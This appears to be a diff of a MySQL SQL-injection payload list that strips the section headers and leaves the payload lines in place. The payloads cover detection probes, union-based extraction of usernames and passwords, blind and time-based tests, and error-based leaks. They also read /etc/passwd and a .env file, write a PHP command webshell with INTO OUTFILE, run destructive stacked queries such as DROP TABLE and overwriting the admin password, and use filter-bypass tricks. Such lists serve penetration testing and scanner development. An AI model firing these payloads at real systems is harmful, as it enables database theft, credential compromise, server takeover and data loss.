@@ -1,8 +1,3 @@
-# ============================================================
-# SQL Injection — MySQL Specific
-# ============================================================
-
-# ---- Detection ----
 '
 "
 `
@@ -15,15 +10,12 @@
 ' OR '1'='1
 " OR "1"="1
 
-# ---- Comments ----
 -- comment
 -- -
-#
 /*comment*/
 /*!comment*/
 /*!50000comment*/
 
-# ---- Union-Based ----
 ' UNION SELECT NULL-- -
 ' UNION SELECT NULL,NULL-- -
 ' UNION SELECT NULL,NULL,NULL-- -
@@ -34,39 +26,29 @@
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
 ' UNION SELECT username,password FROM users-- -
 
-# ---- Blind Boolean ----
 ' AND 1=1-- -
 ' AND 1=2-- -
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
 ' AND (SELECT COUNT(*) FROM users)>0-- -
 
-# ---- Time-Based ----
 ' AND SLEEP(5)-- -
 ' OR SLEEP(5)-- -
 1; SELECT SLEEP(5)
 '; SELECT SLEEP(5)-- -
 ' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
 
-# ---- Error-Based ----
 ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
 ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
 ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
 
-# ---- File Read ----
 ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
 ' UNION SELECT LOAD_FILE('/var/www/html/.env'),NULL-- -
 
-# ---- File Write (webshell) ----
 ' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
 
-# ---- Stacked Queries ----
 '; INSERT INTO users VALUES('hacker','pwned');-- -
 '; DROP TABLE users;-- -
 '; UPDATE users SET password='hacked' WHERE username='admin';-- -
 
-# ---- Bypass ----
-# Spaces: /**/  +  %09  %0a  %0d
 SELECT/**/user/**/FROM/**/users
 ' OR/**/'1'='1
-# Case: SeLeCt, sElEcT
-# Double keywords: SELSELECTECT user()
